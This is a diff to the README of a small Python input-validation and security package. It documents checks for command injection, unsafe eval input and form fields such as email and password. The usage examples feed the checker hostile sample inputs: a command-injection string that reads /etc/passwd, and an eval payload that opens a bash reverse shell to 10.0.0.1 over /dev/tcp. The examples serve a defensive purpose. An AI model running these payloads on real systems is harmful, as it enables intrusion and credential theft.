@@ -42,5 +42,33 @@ This is a simple and very light weight python package to help securing python we
 <h4> Check value is safe to pass to a command or not:</h4>
 <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.command("ls -a ;cat /etc/passwd ")#returns 'True' if it's safe and 'False' if not  </pre></div>
 <h4> Check value is safe to pass to an "eval" function or not:</h4>
-<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.command("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")#returns 'True' if it's safe and 'False' if not  </pre></div>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.eval("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")#returns 'True' if it's safe and 'False' if not  </pre></div>
+
+<h3> Validate User Inputs:</h3>
+<h4> Check value contains alphabets only:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphabet("ala bouali",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value contains numbers only:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.numeric("233 21 4",length=(1,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value contains alphabets only:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphabet("ala bouali",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value is alphanumeric:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.alphanumeric(" ala bOuali12 56",length=(1,50))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value is an Email:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.email("alabouali@gmail.com",length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value is a Phone Number:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.phone_number("+123456789",length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value is a long enough Password:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.password("fvccabah$vhj",length=(8,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if 2 Passwords match and if they are long enough:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.passwords_match("fvccabah$vhj","fvccabah$234",length=(8,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
+
+<h4> Check if value matches a specific Regex:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">FORM_INPUTS.regex_match("alabouali@gmail.com",r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',length=(6,15))#returns 'True' if it's correct and 'False' if not  </pre></div>
 
